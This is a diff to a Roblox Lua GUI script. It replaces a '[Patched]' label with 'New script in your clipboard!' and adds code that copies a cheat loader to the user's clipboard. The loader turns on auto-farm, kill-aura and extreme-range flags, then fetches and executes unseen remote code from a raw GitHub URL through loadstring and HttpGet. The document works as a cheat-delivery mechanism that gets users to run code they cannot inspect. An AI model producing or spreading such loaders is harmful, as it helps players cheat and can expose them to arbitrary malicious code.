@@ -89,7 +89,7 @@ desc.Name = "Description"
 desc.Size = UDim2.new(0, 220, 0, 48)
 desc.Position = UDim2.new(0, 100, 0, 40)
 desc.BackgroundTransparency = 1
-desc.Text = "[Patched]"
+desc.Text = "New script in your clipboard!"
 desc.Font = Enum.Font.Gotham
 desc.TextSize = 16
 desc.TextColor3 = Color3.fromRGB(220, 220, 220)
@@ -260,3 +260,12 @@ delay(100, function()
         closeAndDestroy()
     end
 end)
+
+setclipboard([[
+getgenv().AutoFarmV2 = true
+getgenv().FireTools = true
+getgenv().KillAura = true
+getgenv().Range = 1000000 -- dont edit this code frfr
+getgenv().AutoSpinGift = false -- most anyoning 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/norwaylua/Roblox/refs/heads/main/H.lua"))()
+]])
